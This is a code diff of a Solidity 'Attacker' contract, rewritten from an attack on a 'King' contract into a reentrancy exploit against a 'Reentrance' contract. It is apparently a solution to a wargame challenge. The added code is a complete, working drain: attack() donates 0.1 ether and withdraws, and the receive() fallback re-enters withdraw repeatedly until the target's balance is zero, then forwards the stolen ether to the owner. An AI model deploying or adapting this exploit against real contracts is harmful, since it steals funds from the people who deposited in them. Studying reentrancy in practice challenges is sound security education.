@@ -1,21 +1,49 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.6.12;
-import "./contract.sol";
+import "./Contract.sol";
 
 contract Attacker {
-    King targetContract;
+    Reentrance contractToReenter;
     address owner;
-    constructor(King _targetContract) {
-        targetContract = _targetContract;
+
+    constructor(Reentrance _contractToReenter) public {
+        contractToReenter = _contractToReenter;
         owner = msg.sender;
     }
 
     receive() external payable {
-        require(msg.sender == owner, 'Attacker: cant send ether in');
+        if (msg.sender == owner) {
+            return;
+        }
+
+        if (
+            address(contractToReenter).balance >
+            contractToReenter.balanceOf(address(this))
+        ) {
+            contractToReenter.withdraw(
+                contractToReenter.balanceOf(address(this))
+            );
+        } else if (
+            address(contractToReenter).balance <
+            contractToReenter.balanceOf(address(this))
+        ) {
+            contractToReenter.withdraw(address(contractToReenter).balance);
+        } else if (address(contractToReenter).balance == 0) {
+
+            //send eth to owner after succesfully draining contract 
+            (bool success, ) = payable(owner).call{
+                value: address(this).balance
+            }("");
+            require(success == true, "transfer failed");
+        }
     }
 
     function attack() public {
-       (bool success,) = address(targetContract).call{value: address(this).balance }("");
-       require(success == true, 'Attacker: attack failed');
+        //donate 
+        contractToReenter.donate{value: 0.1 ether}(address(this));
+
+        uint amountToWithdraw = contractToReenter.balanceOf(address(this));
+        //withdraw
+        contractToReenter.withdraw(amountToWithdraw);
     }
 }
